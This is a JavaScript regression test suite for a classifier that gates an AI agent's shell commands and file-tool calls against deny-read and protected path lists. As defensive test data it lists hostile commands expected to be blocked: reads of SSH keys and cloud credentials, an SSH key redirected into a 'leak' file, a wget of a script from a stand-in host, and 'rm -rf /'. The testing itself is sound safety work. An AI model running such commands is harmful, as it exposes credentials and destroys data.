// Gate behavior regression — production-equivalent configuration.
// Migrated from .smoke-out/t7-classifier-test.mjs (was an ad-hoc script):
// the 40 production-config gate cases now run in the standard suite (`npm test`)
// and in CI. Production-equivalent config is used because the point is to lock
// the gate's behavior under the exact denyReadPaths/protectedPaths a real
// deployment uses. Path matching is pure string prefix logic — no filesystem
// access — so these cases are machine-independent.
//
// Run: node --test test-gate-prod.mts  (or via npm test)
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { classifyBashCommand, classifyToolCall, decide } from './src/classifier.ts'

// Production-equivalent denyReadPaths (from a typical cordis.patch.yml)
const DENY_READ = [
  '~/.ssh', '~/.aws', '~/.gnupg', '~/.kube', '~/.docker', '~/.netrc',
  '~/.git-credentials', '~/.npmrc', '~/.pypirc', '~/.config',
  '~/Library/Keychains', '~/Library/Cookies',
]
// Production-equivalent protectedPaths
const PROTECTED = [
  '/Users/zero/Claude Code', '/Applications/Study',
  '/Users/zero/DSH_Work', '/Users/zero/.dsh/skills/quarkclouddrive',
]

function decideBash(cmd, { denyRead = DENY_READ, protectedPaths = PROTECTED } = {}) {
  const c = classifyBashCommand(cmd, denyRead)
  // Replicate index.js: a file_write is allowed only if ALL targets are TM-protected
  let pathsProtected = true
  if (c.category === 'file_write' && c.targetPaths.length > 0) {
    pathsProtected = c.targetPaths.every((p) => protectedPaths.some((pre) => p.startsWith(pre)))
  }
  return { c, d: decide(c, pathsProtected) }
}

test('A. write inside protected dir -> ALLOW', () => {
  for (const cmd of [
    'echo hello > "/Users/zero/Claude Code/自治/.smoke-out/probe.txt"',
    'touch "/Users/zero/DSH_Work/note.md"',
    'mkdir -p "/Users/zero/Claude Code/自治/.smoke-out/sub"',
  ]) {
    const { d } = decideBash(cmd)
    assert.equal(d.allow, true, `protected write allowed :: ${cmd.slice(0, 58)}`)
  }
})

test('B. write outside protected paths -> DENY', () => {
  for (const cmd of [
    'echo x > /Users/zero/Desktop/evil.txt',
    'touch /etc/hosts',
    'echo x > /Users/zero/Documents/out.txt',
  ]) {
    const { d } = decideBash(cmd)
    assert.equal(d.allow, false, `out-of-bounds write denied :: ${cmd.slice(0, 52)}`)
  }
})

test('C. sensitive read interception (~/.ssh etc) -> DENY (forceDeny)', () => {
  for (const cmd of [
    'cat ~/.ssh/id_rsa',
    'cat ~/.ssh/config',
    'ls ~/.aws/',
    'cat ~/.npmrc',
    'cat ~/.git-credentials',
    'cat ~/Library/Keychains/login.keychain-db',
    'grep -r secret ~/.gnupg',
    'cat ~/.ssh/id_rsa > "/Users/zero/Claude Code/自治/.smoke-out/leak.txt"',
  ]) {
    const { c, d } = decideBash(cmd)
    assert.equal(d.allow, false, `sensitive read denied :: ${cmd.slice(0, 46)}`)
    // redirect-to-protected must NOT whitewash a sensitive read
    if (cmd.includes('>')) assert.equal(c.forceDeny, true)
  }
})

test('D. network / system commands -> DENY', () => {
  for (const cmd of [
    'curl https://example.com',
    'wget http://evil.test/x.sh',
    'ssh user@host',
    'git push origin main',
    'git clone https://github.com/x/y.git',
    'npm pack',
    'npm install lodash',
    'brew install jq',
    'kill -9 1234',
    'shutdown -h now',
    'sudo rm -rf /tmp/x',
  ]) {
    const { d } = decideBash(cmd)
    assert.equal(d.allow, false, `denied :: ${cmd.slice(0, 52)}`)
  }
})

test('E. read-only / local commands -> ALLOW (no over-blocking)', () => {
  for (const cmd of [
    'cat "/Users/zero/Claude Code/自治/package.json"',
    'ls -la "/Users/zero/Claude Code/自治"',
    'git status',
    'git log --oneline -5',
    'git diff HEAD',
  ]) {
    const { d } = decideBash(cmd)
    assert.equal(d.allow, true, `local read allowed :: ${cmd.slice(0, 52)}`)
  }
})

test('F. classifyToolCall on tool layer (fs_write_file)', () => {
  const inb = classifyToolCall('fs_write_file', { path: '/Users/zero/Claude Code/自治/ok.txt' }, DENY_READ)
  assert.equal(inb.category, 'file_write')
  assert.equal(inb.forceDeny === true, false)

  const outb = classifyToolCall('fs_write_file', { path: '/Users/zero/Desktop/evil.txt' }, DENY_READ)
  assert.equal(decide(outb, false).allow, false)

  const sens = classifyToolCall('fs_write_file', { path: '~/.ssh/authorized_keys' }, DENY_READ)
  assert.equal(sens.forceDeny === true, true)
  assert.equal(decide(sens, true).allow, false, 'sensitive path wins over protected exemption')

  const rd = classifyToolCall('fs_read_file', { path: '~/.ssh/id_rsa' }, DENY_READ)
  assert.equal(decide(rd, true).allow, false)
})

test('G. temp-dir writes -> ALLOW without snapshot', () => {
  const { d } = decideBash('printf "x" > /tmp/scratch.txt')
  assert.equal(d.allow, true)
  assert.equal(d.shouldSnapshot, false)
})

test('H. catastrophic patterns -> force deny', () => {
  const c = classifyBashCommand('rm -rf /', DENY_READ)
  assert.equal(c.forceDeny === true, true)
  assert.equal(decide(c, true).allow, false, 'denied despite protected path')
})
